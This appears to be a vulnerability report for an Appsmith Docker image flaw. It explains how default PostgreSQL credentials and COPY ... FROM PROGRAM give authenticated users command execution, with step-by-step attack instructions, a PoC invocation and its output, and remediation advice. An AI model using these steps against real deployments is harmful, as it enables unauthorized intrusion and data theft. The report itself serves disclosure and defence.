# CVE-2024-55964 Vulnerability Report

## Vulnerability Overview

| Item | Detail |
|------|--------|
| CVE ID | CVE-2024-55964 |
| CWE | CWE-94 (Improper Control of Generation of Code) |
| CVSS Score | 9.8 (Critical) |
| Affected Software | Appsmith < 1.52 |
| Vulnerability Type | Remote Command Execution |

## Description

An incorrectly configured PostgreSQL instance in the Appsmith Docker image allows authenticated users to execute arbitrary commands inside the container. The vulnerability exists because:

1. Appsmith bundles a PostgreSQL database within its Docker image
2. The PostgreSQL instance uses default credentials (postgres/postgres)
3. The PostgreSQL user has permissions to use `COPY ... FROM PROGRAM` which allows command execution
4. Users can create datasources pointing to the internal PostgreSQL instance

## Attack Vector

1. Attacker accesses Appsmith and creates an account (or logs in)
2. Attacker creates a new workspace
3. Attacker creates a PostgreSQL datasource pointing to `localhost:5432` with credentials `postgres/postgres`
4. Attacker uses the schema preview feature to execute SQL queries
5. Attacker creates a temporary table and uses `COPY table FROM PROGRAM 'command'` to execute system commands
6. Command output is stored in the table and can be retrieved

## Proof of Concept

```bash
python poc.py http://localhost:18181 "id"
```

### Successful Exploitation Result

```
[*] Target: http://localhost:18181
[*] Command: id
[+] Signup successful
[+] Login successful
[+] Created workspace: 698236faffba7c00b1fe0c3d
[+] Found PostgreSQL plugin: 69823681ffba7c00b1fe0c05
[+] Created datasource: 698236fbffba7c00b1fe0c41
[+] Created temporary table: poc_dspgzv
[+] Command executed

[+] Command output:
--------------------------------------------------
uid=105(postgres) gid=105(postgres) groups=105(postgres),103(ssl-cert)
--------------------------------------------------

[+] Exploit completed successfully
```

## Environment

- Appsmith Version: v1.47
- Docker Image: appsmith/appsmith-ce:v1.47
- Container OS: Ubuntu 20.04.6 LTS

## Impact

An authenticated attacker can execute arbitrary commands inside the Appsmith Docker container with postgres user privileges. This could lead to:

- Data theft (accessing sensitive application data)
- Container escape attempts
- Lateral movement within the network
- Denial of service

## Remediation

Upgrade Appsmith to version 1.52 or later, which fixes the PostgreSQL configuration issue.

## References

- https://rhinosecuritylabs.com/research/cve-2024-55963-unauthenticated-rce-in-appsmith/
- https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2024-55963
- https://github.com/appsmithorg/appsmith/security/advisories/GHSA-m95x-4w54-gc83
